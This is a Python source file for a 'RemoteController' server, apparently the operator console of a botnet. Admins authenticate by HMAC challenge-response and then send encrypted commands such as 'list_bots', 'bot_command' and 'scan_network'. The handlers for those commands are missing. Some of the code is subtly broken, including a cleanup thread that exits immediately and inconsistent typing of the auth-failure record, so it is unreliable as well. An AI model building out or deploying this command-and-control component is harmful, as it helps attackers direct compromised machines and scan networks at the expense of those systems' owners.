from __future__ import annotations
import os
import socket
import threading
import json
import base64
import hmac
import hashlib
import time
import logging
from typing import Dict, List, Optional, Any, Union, Set
from pathlib import Path
from datetime import datetime, timedelta
from utils.crypto import Crypto

class Session:
    """Remote control session class"""
    def __init__(self, token: str, admin_id: str, expire_hours: int = 24) -> None:
        self.token = token
        self.admin_id = admin_id
        self.created_at = datetime.now()
        self.expire_at = self.created_at + timedelta(hours=expire_hours)
        self.last_active = datetime.now()
        
    def is_expired(self) -> bool:
        """Check if session is expired"""
        return datetime.now() > self.expire_at
        
    def update_activity(self) -> None:
        """Update last activity timestamp"""
        self.last_active = datetime.now()
        
class RemoteController:
    def __init__(self, host: str = '0.0.0.0', port: int = 4445) -> None:
        self.host = host
        self.port = port
        self.crypto = Crypto()
        self.running = False
        self.logger = logging.getLogger(__name__)
        
        # Authentication
        self.admins: Dict[str, Dict[str, Any]] = {}
        self.sessions: Dict[str, Session] = {}
        self.auth_failures: Dict[str, int] = {}
        self.max_auth_failures = 5
        self.auth_timeout = 300  # 5 minutes
        self.session_lock = threading.Lock()
        
        # Load admin credentials
        self._load_admins()
        
        # Start session cleanup
        self._start_session_cleanup()
        
    def start(self) -> bool:
        """Start remote control server

        Returns:
            bool: True if started successfully
        """
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.host, self.port))
            self.sock.listen(5)
            
            self.running = True
            
            # Accept connections thread
            self.accept_thread = threading.Thread(target=self._accept_connections)
            self.accept_thread.daemon = True
            self.accept_thread.start()
            
            self.logger.info(f"Remote control listening on {self.host}:{self.port}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error starting remote control: {str(e)}")
            return False
            
    def stop(self) -> None:
        """Stop remote control server"""
        self.running = False
        if hasattr(self, 'sock'):
            self.sock.close()
            
        # Save admin data
        self._save_admins()
        
    def _accept_connections(self) -> None:
        """Accept incoming connections"""
        while self.running:
            try:
                client, addr = self.sock.accept()
                client_thread = threading.Thread(
                    target=self._handle_client,
                    args=(client, addr)
                )
                client_thread.daemon = True
                client_thread.start()
                
            except Exception as e:
                if self.running:
                    self.logger.error(f"Error accepting connection: {str(e)}")
                    
    def _handle_client(self, client: socket.socket, addr: tuple) -> None:
        """Handle client connection

        Args:
            client (socket.socket): Client socket
            addr (tuple): Client address
        """
        try:
            # Authentication
            session = self._authenticate_client(client, addr)
            if not session:
                client.close()
                return
                
            while self.running:
                # Receive command
                encrypted_data = client.recv(4096)
                if not encrypted_data:
                    break
                    
                # Decrypt and process
                data = self.crypto.decrypt(encrypted_data)
                response = self._process_command(session, json.loads(data))
                
                # Encrypt and send response
                encrypted_response = self.crypto.encrypt(json.dumps(response))
                client.send(encrypted_response)
                
                # Update session activity
                session.update_activity()
                
        except Exception as e:
            self.logger.error(f"Error handling client {addr}: {str(e)}")
            
        finally:
            # Cleanup
            if client:
                client.close()
                
    def _authenticate_client(self, client: socket.socket, addr: tuple) -> Optional[Session]:
        """Authenticate remote client

        Args:
            client (socket.socket): Client socket
            addr (tuple): Client address

        Returns:
            Optional[Session]: Session if authenticated
        """
        try:
            # Check for auth failures
            ip = addr[0]
            if self._is_ip_blocked(ip):
                return None
                
            # Send challenge
            challenge = base64.b64encode(os.urandom(32)).decode()
            client.send(challenge.encode())
            
            # Get response
            try:
                response = client.recv(1024).decode()
            except:
                self._record_auth_failure(ip)
                return None
                
            # Parse response
            try:
                auth_data = json.loads(response)
                admin_id = auth_data['admin_id']
                signature = auth_data['signature']
            except:
                self._record_auth_failure(ip)
                return None
                
            # Verify admin exists
            if admin_id not in self.admins:
                self._record_auth_failure(ip)
                return None
                
            admin = self.admins[admin_id]
            
            # Verify signature
            expected_sig = self._calculate_signature(
                challenge,
                admin['key']
            )
            
            if not hmac.compare_digest(signature, expected_sig):
                self._record_auth_failure(ip)
                return None
                
            # Create session
            with self.session_lock:
                session = Session(
                    os.urandom(32).hex(),
                    admin_id
                )
                self.sessions[session.token] = session
                
            self.logger.info(f"Admin {admin_id} authenticated from {ip}")
            return session
            
        except Exception as e:
            self.logger.error(f"Authentication error: {str(e)}")
            return None
            
    def _process_command(self, session: Session, command: Dict[str, Any]) -> Dict[str, Any]:
        """Process command from admin

        Args:
            session (Session): Admin session
            command (Dict[str, Any]): Command to process

        Returns:
            Dict[str, Any]: Command response
        """
        try:
            cmd = command.get('command')
            args = command.get('args', [])
            
            # Verify session
            if session.is_expired():
                return {
                    'status': 'error',
                    'message': 'Session expired'
                }
                
            # Process command
            if cmd == 'list_bots':
                return self._handle_list_bots()
            elif cmd == 'bot_command':
                return self._handle_bot_command(args)
            elif cmd == 'scan_network':
                return self._handle_scan_network(args)
            else:
                return {
                    'status': 'error',
                    'message': 'Unknown command'
                }
                
        except Exception as e:
            return {
                'status': 'error',
                'message': str(e)
            }
            
    def add_admin(self, admin_id: str, name: str) -> str:
        """Add new admin

        Args:
            admin_id (str): Admin ID
            name (str): Admin name

        Returns:
            str: Admin API key
        """
        try:
            with self.session_lock:
                if admin_id in self.admins:
                    raise ValueError(f"Admin {admin_id} already exists")
                    
                # Generate API key
                key = base64.b64encode(os.urandom(32)).decode()
                
                # Add admin
                self.admins[admin_id] = {
                    'id': admin_id,
                    'name': name,
                    'key': key,
                    'created_at': datetime.now().isoformat()
                }
                
                # Save changes
                self._save_admins()
                
                self.logger.info(f"Added admin: {admin_id}")
                return key
                
        except Exception as e:
            self.logger.error(f"Error adding admin: {str(e)}")
            raise
            
    def remove_admin(self, admin_id: str) -> bool:
        """Remove admin

        Args:
            admin_id (str): Admin ID to remove

        Returns:
            bool: True if removed successfully
        """
        try:
            with self.session_lock:
                if admin_id not in self.admins:
                    return False
                    
                # Remove admin
                del self.admins[admin_id]
                
                # Remove sessions
                for token, session in list(self.sessions.items()):
                    if session.admin_id == admin_id:
                        del self.sessions[token]
                        
                # Save changes
                self._save_admins()
                
                self.logger.info(f"Removed admin: {admin_id}")
                return True
                
        except Exception as e:
            self.logger.error(f"Error removing admin: {str(e)}")
            return False
            
    def _load_admins(self) -> None:
        """Load admin data from file"""
        try:
            admin_file = Path('admins.json')
            if admin_file.exists():
                with open(admin_file) as f:
                    self.admins = json.load(f)
        except Exception as e:
            self.logger.error(f"Error loading admins: {str(e)}")
            
    def _save_admins(self) -> None:
        """Save admin data to file"""
        try:
            with open('admins.json', 'w') as f:
                json.dump(self.admins, f, indent=2)
        except Exception as e:
            self.logger.error(f"Error saving admins: {str(e)}")
            
    def _calculate_signature(self, challenge: str, key: str) -> str:
        """Calculate authentication signature

        Args:
            challenge (str): Challenge string
            key (str): Admin API key

        Returns:
            str: HMAC signature
        """
        return hmac.new(
            key.encode(),
            challenge.encode(),
            hashlib.sha256
        ).hexdigest()
        
    def _record_auth_failure(self, ip: str) -> None:
        """Record authentication failure for IP

        Args:
            ip (str): Client IP address
        """
        with self.session_lock:
            if ip not in self.auth_failures:
                self.auth_failures[ip] = {
                    'count': 0,
                    'first_failure': time.time()
                }
            self.auth_failures[ip]['count'] += 1
            
    def _is_ip_blocked(self, ip: str) -> bool:
        """Check if IP is blocked due to auth failures

        Args:
            ip (str): IP address to check

        Returns:
            bool: True if IP is blocked
        """
        with self.session_lock:
            if ip not in self.auth_failures:
                return False
                
            failures = self.auth_failures[ip]
            
            # Check if timeout has expired
            if time.time() - failures['first_failure'] > self.auth_timeout:
                del self.auth_failures[ip]
                return False
                
            # Check failure count
            return failures['count'] >= self.max_auth_failures
            
    def _start_session_cleanup(self) -> None:
        """Start session cleanup thread"""
        def cleanup_loop() -> None:
            while self.running:
                try:
                    with self.session_lock:
                        # Remove expired sessions
                        for token, session in list(self.sessions.items()):
                            if session.is_expired():
                                del self.sessions[token]
                                
                        # Remove old auth failures
                        for ip in list(self.auth_failures.keys()):
                            if time.time() - self.auth_failures[ip]['first_failure'] > self.auth_timeout:
                                del self.auth_failures[ip]
                                
                except Exception as e:
                    self.logger.error(f"Session cleanup error: {str(e)}")
                    
                time.sleep(60)  # Run every minute
                
        thread = threading.Thread(target=cleanup_loop)
        thread.daemon = True
        thread.start()